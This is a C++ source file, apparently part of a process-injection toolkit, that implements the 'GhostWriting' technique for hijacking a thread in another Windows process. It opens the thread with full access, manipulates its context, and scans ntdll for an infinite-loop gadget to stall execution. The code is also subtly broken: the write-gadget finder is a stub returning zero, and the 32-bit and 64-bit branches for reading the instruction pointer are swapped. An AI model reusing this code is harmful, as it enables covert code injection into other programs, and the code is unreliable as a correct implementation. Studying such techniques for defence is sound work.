#include <iostream>
#include "GhostWritingInjection.h"
#include "../Common/Utils.h"
#include "../Common/Process.h"

namespace
{
    bool is32BitsThread(HANDLE threadHandle)
    {
        DWORD pid = GetProcessIdOfThread(threadHandle);
        HANDLE procHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION , false, pid);
        BOOL isWow64 = false;
        if (!IsWow64Process(procHandle, &isWow64))
        {
            std::cerr << "IsWow64Process error " << GetLastError() << std::endl;
        }
        CloseHandle(procHandle);
        return isWow64;
    }

    uintptr_t GetRIP(void* context, bool is32Bits)
    {
        if (is32Bits)
        {
            return reinterpret_cast<PCONTEXT>(context)->Rip;
        }
        else
        {
            return reinterpret_cast<PWOW64_CONTEXT>(context)->Eip;
        }
    }
}

GhostWriter::GhostWriter(DWORD threadID)
{
    this->threadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, threadID);
    if (!this->threadHandle)
    {
        ThrowException(std::string("GhostWriter: OpenThread error ") + std::to_string(GetLastError()));
    }
    this->is32Bits = is32BitsThread(this->threadHandle);
}

HANDLE GhostWriter::GetThreadHandle()
{
    return this->threadHandle;
}

bool GhostWriter::SuspendThread()
{
    if (::SuspendThread(this->threadHandle) > -1)
    {
        return true;
    }
    std::cerr << "SuspendThread error " << GetLastError();
    return false;
}

bool GhostWriter::ResumeThread()
{
    if (::ResumeThread(this->threadHandle) > -1)
    {
        return true;
    }
    std::cerr << "ResumeThread error " << GetLastError();
    return false;
}

void GhostWriter::SetLoopGadget(BYTE* address)
{
    this->loopGadgetAddr = address;
}

void GhostWriter::SetWriteGadget(BYTE* address)
{
    this->writeGadgetAddr = address;
}

void GhostWriter::GetContext(void* context)
{
    this->SuspendThread();
    if (this->is32Bits)
    {
        Wow64GetThreadContext(this->threadHandle, reinterpret_cast<PWOW64_CONTEXT>(context));
    }
    else
    {
        GetThreadContext(this->threadHandle, reinterpret_cast<LPCONTEXT>(context));
    }
    this->ResumeThread();
}

void GhostWriter::SetContext(void* context)
{
    this->SuspendThread();
    if (this->is32Bits)
    {
        Wow64SetThreadContext(this->threadHandle, reinterpret_cast<PWOW64_CONTEXT>(context));
    }
    else
    {
        SetThreadContext(this->threadHandle, reinterpret_cast<LPCONTEXT>(context));
    }
    this->ResumeThread();
}

void GhostWriter::WaitForLoop()
{
    unsigned int contextSize = max(sizeof(CONTEXT), sizeof(WOW64_CONTEXT));
    auto context = std::make_unique<BYTE[]>(contextSize);

    while (true)
    {
        this->SuspendThread();
        this->GetContext(context.get());
        this->ResumeThread();
        if (reinterpret_cast<uintptr_t>(this->loopGadgetAddr) == GetRIP(context.get(), this->is32Bits))
        {
            return;
        }
        Sleep(100);
    }
}

// ***********************************

namespace
{
    BYTE* FindLoopGadget(Process& proc)
    {
        MODULEENTRY32 meNtdll = proc.GetModule("ntdll.dll");
        PE peNtdll = PE(meNtdll.szExePath);

        BYTE* loopGadgetPtr = peNtdll.ScanSections((BYTE*)"\xEB\xFE", "..", true);
        if (!loopGadgetPtr)
        {
            std::cerr << "Could not find loop gadget\n";
            return 0;
        }
        return meNtdll.modBaseAddr + peNtdll.BufferToRVA(loopGadgetPtr);
    }

    BYTE* FindWriteGadget(Process& proc)
    {
        return 0;
    }
}
